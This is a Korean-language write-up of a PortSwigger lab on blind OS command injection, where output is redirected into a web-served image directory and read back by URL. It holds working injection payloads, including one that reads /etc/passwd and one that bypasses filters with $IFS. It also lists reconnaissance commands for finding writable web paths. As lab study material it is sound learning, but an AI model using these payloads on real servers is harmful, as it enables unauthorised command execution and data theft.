# Lab: Blind OS command injection with output redirection

## 개요

- **난이도**: Practitioner
- **주제**: OS Command Injection — Blind / 출력 리다이렉션 / 웹 접근 가능 경로 활용
- **링크**: https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection

## 목표

Blind 환경에서 명령 실행 결과를 웹 서버가 서빙하는 디렉토리에 파일로 저장하고, 해당 URL 로 접근해 `whoami` 결과를 확인한다.

## 이전 랩과의 차이

```
[002 랩 — 시간 지연]
  sleep 으로 실행 여부만 확인
  → 실제 데이터 추출 불가

[003 랩 (이번) — 출력 리다이렉션]
  실행 결과를 웹 접근 가능 경로에 파일로 저장
  → URL 로 파일 내용 직접 읽기 가능
  → 실제 데이터 추출 가능
```

## 공격 단계

### 1단계 — 출력을 파일로 저장

```
email=||whoami>/var/www/images/output.txt||
```

서버에서 실행:
```bash
process_feedback ... ||whoami>/var/www/images/output.txt|| ...
# whoami 실행 → 결과를 /var/www/images/output.txt 에 저장
```

### 2단계 — 파일 URL 로 접근

```
GET /image?filename=output.txt
```

응답:
```
peter-gBxxxx
```

## 웹 접근 가능 경로를 어떻게 아는가

이번 랩에서는 이미지 경로가 노출되어 `/var/www/images/` 를 특정할 수 있었다.
실제 환경에서 쓰기 가능한 웹 접근 경로를 찾는 방법:

### 1. 이미지/파일 URL 패턴 분석

```
사이트의 정적 파일 URL 확인:
  /image?filename=foo.jpg
  /static/images/bar.png
  /uploads/photo.jpg

→ 서버 파일시스템 경로 추정:
  /image?filename=foo.jpg → /var/www/images/foo.jpg 가능성
  /uploads/photo.jpg      → /var/www/html/uploads/ 또는
                            /home/ubuntu/app/uploads/ 등
```

### 2. 에러 메시지에서 경로 노출

```
파일 없을 때 에러:
  FileNotFoundError: /var/www/html/images/missing.jpg
  [Errno 2] No such file or directory: '/app/static/missing.png'
  → 절대 경로 직접 노출
```

### 3. 파일 업로드 기능 활용

```
프로필 사진, 첨부파일 업로드 후 URL 확인:
  업로드: photo.jpg
  URL:    /uploads/photo.jpg

→ 업로드 디렉토리 = 쓰기 가능 + 웹 접근 가능 ✓
→ /var/www/html/uploads/ 등으로 추정
```

### 4. 프레임워크별 기본 경로

```
[Apache / Nginx + Linux]
  /var/www/html/
  /var/www/html/images/
  /var/www/html/uploads/

[Node.js Express]
  /app/public/
  /app/static/

[PHP]
  /var/www/html/
  /srv/http/

[Tomcat (Java)]
  /usr/share/tomcat/webapps/ROOT/
  /var/lib/tomcat/webapps/ROOT/

[Django / Flask]
  /app/static/
  /app/media/
```

### 5. 설정 파일 읽기

```
이미 RCE 가 가능하다면:
  cat /etc/apache2/sites-enabled/*.conf
  cat /etc/nginx/sites-enabled/*
  cat /proc/self/environ           ← 환경변수에 경로 포함될 수 있음
  cat /proc/self/cmdline           ← 실행 명령어 확인

→ DocumentRoot, root 지시어에서 웹 루트 경로 확인
```

### 6. /proc/self/cwd 활용

```bash
ls -la /proc/self/cwd
→ 현재 작업 디렉토리 확인
→ 웹 애플리케이션 루트와 관련된 경우 많음

readlink /proc/self/cwd
→ /var/www/html  또는  /app  등
```

### 7. find 명령으로 쓰기 가능 디렉토리 탐색

```bash
find / -writable -type d 2>/dev/null
→ 현재 프로세스가 쓸 수 있는 모든 디렉토리 목록

find /var/www -writable -type d 2>/dev/null
→ 웹 루트 내 쓰기 가능 디렉토리만 탐색
```

## 활용 가능한 출력 리다이렉션 위치 요약

```
[우선순위]
1. 파일 업로드 디렉토리 (/uploads/, /images/)
   → 이미 쓰기 가능 + 웹 접근 가능
2. 정적 파일 디렉토리 (/static/, /assets/)
3. 웹 루트 (/var/www/html/)
4. /tmp/ (쓰기는 가능하지만 웹 접근 불가 → OOB 필요)
```

## 페이로드 변형

```bash
# 기본
||whoami>/var/www/images/out.txt||

# 여러 명령 결과 저장
||id>/var/www/images/out.txt||
||cat /etc/passwd>/var/www/images/out.txt||

# 명령 결과 누적 (append)
||whoami>>/var/www/images/out.txt||

# 공백 없는 경로 (필터 우회)
||whoami>$IFS/var/www/images/out.txt||
```

## 핵심 정리

- Blind OS Command Injection 에서 출력 리다이렉션(`>`)을 사용하면 실행 결과를 파일로 저장해 URL 로 읽을 수 있다.
- 쓰기 가능한 웹 접근 경로를 찾는 것이 핵심이며, 이미지/파일 URL 패턴, 에러 메시지, 파일 업로드 기능, 프레임워크 기본 경로를 단서로 추정한다.
- 실제 환경에서는 `/proc/self/cwd`, 설정 파일 읽기, `find` 명령으로 경로를 확인할 수 있다.
- 쓰기 가능 경로를 모를 때는 OOB(out-of-band) 방식(DNS/HTTP)으로 전환하는 것이 현실적이다.

## 배운 점

### 데이터 추출 방법 3가지 비교

| 방법 | 조건 | 장점 | 단점 |
|------|------|------|------|
| 즉시 출력 | 결과가 응답에 반영 | 즉시 확인 | 즉시 출력 환경에만 가능 |
| 출력 리다이렉션 | 쓰기 가능 + 웹 접근 경로 파악 | 긴 출력도 저장 가능 | 경로를 알아야 함 |
| OOB (DNS/HTTP) | Burp Collaborator 등 외부 서버 | 경로 불필요, 방화벽 내부도 가능 | 외부 서버 필요 |
